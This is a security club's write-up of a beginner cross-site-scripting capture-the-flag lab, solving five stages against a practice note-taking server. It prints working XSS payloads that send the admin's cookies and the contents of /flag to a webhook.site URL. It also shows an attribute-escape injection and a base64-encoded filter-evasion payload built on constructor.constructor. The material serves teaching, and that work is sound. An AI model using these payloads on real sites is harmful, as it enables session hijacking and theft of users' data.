---
layout: post
title:  "beginner xss recap"
date:   2021-09-23
categories: web
---

Last meeting (9/23), we went over some beginner XSS (Cross Site Scripting). These are the solutions to the multi-stage challenge that you had lab time to work on.

You can reference the lecture [here](https://docs.google.com/presentation/d/17Gc2c_fv2uEVucDAzmRulf_lyIwglVO-V9X283Geip8/edit#slide=id.p).

Note: the later stages of the challenges were much more than beginner-level, so don't worry if you couldn't get them!

Overall, there were 5 stages:
- [admin cookie flag](#admin-cookie)
- read `/flag` with:
    - [static note type](#static-note)
    - [dynamic note type](#dynamic-note)
    - [image note type](#image-note)
    - [filtered note type](#filtered-note)


The source of the challenge server is also available on [GitHub](https://github.com/blairsec/club-challs-2021/blob/master/xss/site/src/index.ts).

For those who were confused of the overall flow of the challenge, the goal is to achieve XSS and submit a page with malicious code to the admin bot. The admin bot simulates a real person and "visits" the page, (hopefully) triggering your XSS which you can then leverage and turn into a flag. In the real world, the admin bot could be someone important such as someone with a valuable bank account.


#### admin cookie  
We can use [webhook.site](https://webhook.site/) to log our requests.

In this session, my webhook was at `https://webhook.site/8d6fb386-328a-40e7-be2b-f124729267de`. Yours probably will look similar, but will have a different UUID (the part after `.site/`).
 
To test that XSS indeed exists, let's make a static note that just sends a GET request to our webhook.site:  
{% raw %}  
```html  
<script>  
fetch("https://webhook.site/8d6fb386-328a-40e7-be2b-f124729267de")  
</script>  
```  
{% endraw %}  
 
Let's try to steal the cookie of the admin. Using Javascript, we can access the cookies using `document.cookie`. Keep in mind this only works for non-HttpOnly cookies. Read more about HttpOnly cookies [here](https://www.cookiepro.com/knowledge/httponly-cookie/).  
- In short, HttpOnly cookies cannot be accessed by any script run by the browser, including anything malicious that we might put there  
 
{% raw %}  
```html  
<script>  
fetch("https://webhook.site/8d6fb386-328a-40e7-be2b-f124729267de/?" + document.cookie)  
</script>  
```  
{% endraw %}  
 
This appends any of the admin's non-HttpOnly cookies to the url, plus the `?`. The `?` marks anything after that as a key-value pair of GET request parameters.  
 
`/?asdf=fdsa&zxcv=vcxz` would contain:  
- asdf: fdsa  
- zxcv: vcxz  
 
It also just happens that document.cookie is in `key=value` format.  
 
Submitting the site to the admin, we get a request to `https://webhook.site/8d6fb386-328a-40e7-be2b-f124729267de?cookie_flag=flag%7Bcookie_monster_nom_nom%7D`.

webhook.site automatically extracts the GET request parameters for us, and we can see the flag under the `Query strings` section.  
 
Flag: `flag{cookie_monster_nom_nom}`  
 
#### static note
This time, we want to read `/flag` as the admin and then send the content of whatever we read to ourselves.  
 
Using [Mozilla docs](https://developer.mozilla.org/en-US/docs/Web/API/Response/text) for the fetch() api, we see we can use `fetch(url).then(resp => resp.text().then(text => {function}))` to read the contents of `url`. We can then send the content back to ourselves like how we stole the admin's cookies.  
{% raw %}  
```html  
<script>  
fetch("/flag").then(resp =>
    resp.text().then(s =>
        fetch("https://webhook.site/8d6fb386-328a-40e7-be2b-f124729267de/?flag=" + s)
    )
)
</script>
```  
{% endraw %}

Flag: `flag{starting_off_with_baby_steps}`

#### dynamic note
According to the provided source, the site is rendered with a JavaScript that fetches the user data and then uses `.innerHTML` to populate the user data field, instead of templating it directly. This means that using `<script>` tags won't work because the scripts won't run.

However, we can easily bypass this by using the [`onerror`](https://www.w3schools.com/jsref/event_onerror.asp) property of a dummy image.

In short, the `onerror` property runs the JavaScript assigned to it whenever the image or other structure fails to load. We can make an image with `src="x"` to guarantee that the image load fails, meaning our JavaScript will always run.

Then, we just do the same thing we did last time for the static note, albeit slightly minimized to fit in one line.
```html
<img src="x" onerror='fetch("/flag").then(resp => resp.text().then(s => fetch("https://webhook.site/8d6fb386-328a-40e7-be2b-f124729267de/?flag=" + s)))' />
```

Flag: `flag{leeking_deets_like_a_boss}`

#### image note

According to the source, when we create an image note our payload is inserted into the form `<img src="${note.content}"`.

This is really easy to escape. You only need to put a double quote to complete the `src="` and then you can define your own `onerror` handler.

I used \` (backtick) for my strings because JavaScript is cool like that. You could probably find a way to escape the strings using `\`.

```
x" onerror='fetch(`/flag`).then(resp => resp.text().then(s => fetch(`https://webhook.site/8d6fb386-328a-40e7-be2b-f124729267de/?flag=` + s)))' style="
```

Flag: `flag{the_great_property_escape}`

#### filtered note
The filter consists of the following banned keywords:
```javascript
["script",
"img",
"onerror",
"iframe",
"fetch",
"window",
"eval",
"function",
"then",
"{",
"}",
"xmlhttprequest",
"navigator",
"location",
"self",
]
```

You could think of a very creative and inspiring solution to get around this denylist. Or you could use an [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

I used `<svg><animate onbegin='<payload>' attributeName=x dur=1s>` to achieve XSS.

The process of breaking out of JavaScript jails is typically just a get-it-or-you-don't kind of situation. With so many important keywords banned, it is generally a good idea to find a way to hide the payload used to send yourself the flag with some sort of encoding so the filter cannot detect it. Then, you can decode it and evaluate it. But wait, `eval` is banned too.

It turns out that JavaScript is the best language in the world and you can create a function out of a string. For example, `([]).constructor.constructor('alert(1)')()` constructs a function that does `alert(1)` and runs it. This is super powerful because we can now encode our flag payload and hide it into this function.

Taking our payload from our [dynamic note](#dynamic-note) solution, we can base64 encode it to get it past the filter. Then, we can use `atob()` to convert it back when JavaScript evaluates.

```javascript
// ZmV0Y2goIi9mbGFnIikudGhlbihyZXNwID0+IHJlc3AudGV4dCgpLnRoZW4ocyA9PiBmZXRjaCgiaHR0cHM6Ly93ZWJob29rLnNpdGUvOGQ2ZmIzODYtMzI4YS00MGU3LWJlMmItZjEyNDcyOTI2N2RlLz9mbGFnPSIgKyBzKSkp
// is the base64 encoded version of:
fetch("/flag").then(resp => resp.text().then(s => fetch("https://webhook.site/8d6fb386-328a-40e7-be2b-f124729267de/?flag=" + s)))
```

Putting it all together, our final payload is:
{% raw %}
```html
<svg><animate onbegin='([]).constructor.constructor(atob("ZmV0Y2goIi9mbGFnIikudGhlbihyZXNwID0+IHJlc3AudGV4dCgpLnRoZW4ocyA9PiBmZXRjaCgiaHR0cHM6Ly93ZWJob29rLnNpdGUvOGQ2ZmIzODYtMzI4YS00MGU3LWJlMmItZjEyNDcyOTI2N2RlLz9mbGFnPSIgKyBzKSkp"))()' attributeName=x dur=1s>
```
{% endraw %}

Flag: `flag{cant_stop_me_now}`

See you at our next meeting, on 9/30! We'll also go over the challenge then, although perhaps not in so much detail.

~ josh
